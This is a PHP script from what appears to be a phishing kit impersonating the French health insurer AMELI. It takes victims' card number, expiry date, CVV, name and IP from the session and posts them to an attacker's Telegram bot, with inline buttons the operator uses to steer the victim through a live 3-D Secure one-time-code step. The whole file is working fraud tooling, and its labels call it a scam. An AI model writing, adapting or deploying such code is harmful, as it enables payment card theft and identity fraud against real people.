<?php

include("../common/includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
    session_start();
}

$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443)) ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'];
$baseUrl = $protocol . $host . '/';

$ip = $_SERVER['REMOTE_ADDR'];
$smsUrl = $baseUrl . "/redirect/log.php?id=" . urlencode($ip) . "&page=sms.php";
$doneUrl = $baseUrl . "/redirect/log.php?id=" . urlencode($ip) . "&page=confirme.php";
$vbvRefuseUrl = $baseUrl . "/redirect/log.php?id=" . urlencode($ip) . "&page=vbv.php?error=true";

$replyMarkup = [
    'inline_keyboard' => [
        [
            ['text' => '❌ Refuser VBV', 'url' => $vbvRefuseUrl],
        ],
        [
            ['text' => '✅ Terminer', 'url' => $doneUrl],
        ]
    ]
];

$CCNAME   = isset($_SESSION['ccname']) ? $_SESSION['ccname'] : '-';
$CC       = isset($_SESSION['cc']) ? $_SESSION['cc'] : '-';
$DDE      = isset($_SESSION['dde']) ? $_SESSION['dde'] : '-';
$CVV      = isset($_SESSION['cvv']) ? $_SESSION['cvv'] : '-';
$lastname = isset($_SESSION['Nom']) ? $_SESSION['Nom'] : '-';
$firstname = isset($_SESSION['Prenom']) ? $_SESSION['Prenom'] : '-';
$birthdate = isset($_SESSION['Ddn']) ? $_SESSION['Ddn'] : '-';
$email    = isset($_SESSION['mail']) ? $_SESSION['mail'] : '-';
$address  = isset($_SESSION['adresse']) ? $_SESSION['adresse'] : '-';
$address2 = isset($_SESSION['adresse2']) ? $_SESSION['adresse2'] : '-';
$city     = isset($_SESSION['city']) ? $_SESSION['city'] : '-';
$phone    = isset($_SESSION['tel']) ? $_SESSION['tel'] : '-';
$date     = date('d/m/Y');
$heure    = date('H\hi');

if (!empty($otp_mode)) {
    $message  = "<b>🏦 [ +1 VBV // AMELI ]</b>\n\n";
    $message .= "<b>🪪 Titulaire :</b> <code>{$CCNAME}</code>\n";
    $message .= "<b>💳 Num carte :</b> <code>{$CC}</code>\n";
    $message .= "<b>📅 Date Expiration :</b> <code>{$DDE}</code>\n";
    $message .= "<b>🔒 Cryptogramme :</b> <code>{$CVV}</code>\n\n";
    $message .= "<b>🌐 IP :</b> <code>{$ip}</code>\n";
    $message .= "<blockquote><b>🕒 Rez le [ <code>{$date}</code> à <code>{$heure}</code> ]</b>\n";
    $message .= "<b>🧑‍💻 Scamma - [ <code>AMELI</code> ]</b></blockquote>";

    $telegram_url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
    $post_fields = array(
        'chat_id' => $rez_card,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($replyMarkup)
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log('Telegram API error: ' . curl_error($ch));
    } else {
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_status >= 400) {
            error_log("Telegram API HTTP status $http_status: $response");
        }
    }
    curl_close($ch);

    setlocale(LC_TIME, 'fr_FR');
    date_default_timezone_set('Europe/Paris');
    $date = date("d/m/Y");
    $heure = date("H:i:s");

    header('location: ../pages/chargement.php');
} else {
    header('location: ../pages/confirme.php');
}
